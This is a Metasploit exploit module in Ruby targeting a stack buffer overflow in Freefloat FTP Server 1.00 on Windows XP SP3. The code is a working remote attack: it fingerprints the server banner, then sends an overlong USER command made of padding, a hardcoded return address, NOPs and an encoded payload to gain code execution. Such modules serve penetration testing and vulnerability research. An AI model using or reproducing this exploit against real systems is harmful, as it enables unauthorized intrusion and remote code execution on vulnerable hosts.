##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::Ftp
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Freefloat FTP <= 1.00 Stack Buffer Overflow',
            'Description'    => %q{
                    This module exploits a vulnerability in Freefloat FTP service version 1.00.
                This module uses the USER command to trigger the overflow.
            },
            'Author'         =>
                    [
                        '0v3r',         # original version
                        'Muhamad Fadzil Ramli'  # metasploit module
                    ],
            'License'        => MSF_LICENSE,
            'Version'        => '$Revision: $',
            'References'     =>
                [
                    [ 'EDB', '15689' ],
                    [ 'URL', 'http://www.freefloat.com/software/freefloatftpserver.zip' ]
                ],
            'DefaultOptions' =>
                        {
                                'EXITFUNC' => 'process',
                    'RPORT'    => 21
                        },
            'Privileged'     => false,
            'Payload'        =>
                {
                    'Space'    => 512,
                    'BadChars' => "\x00\x0a\x0d\xff\x20",
                    'StackAdjustment' => -3500,
                    'DisableNops' => true
                },
            'Platform'       => 'win',
            'Targets'        =>
                                [
                    [ 'Windows XP SP3 (EN)', { 'Ret' => 0x5AD86AEB } ], # push esp, ret [uxtheme.dll]
                ],
            'DisclosureDate' => 'December 5 2010',
            'DefaultTarget'  => 0))
        deregister_options('FTPUSER','FTPPASS')
    end
 
    def check
        connect
        disconnect
        if (banner =~ /FreeFloat Ftp Server \(Version 1\.00\)/)
            return Exploit::CheckCode::Vulnerable
        end
        return Exploit::CheckCode::Safe
    end
 
    def exploit
 
        connect
        print_status("Trying target #{target.name}...")
 
        buf =  rand_text_alpha(230)
        buf << [target.ret].pack('V')
        buf << make_nops(16)
        buf << payload.encoded
        #buf    << rand_text_alpha(1000 - buf.length)
 
        #send_cmd( ['USER',buf],false )
        send_user(buf)
 
        handler
        disconnect
    end
end
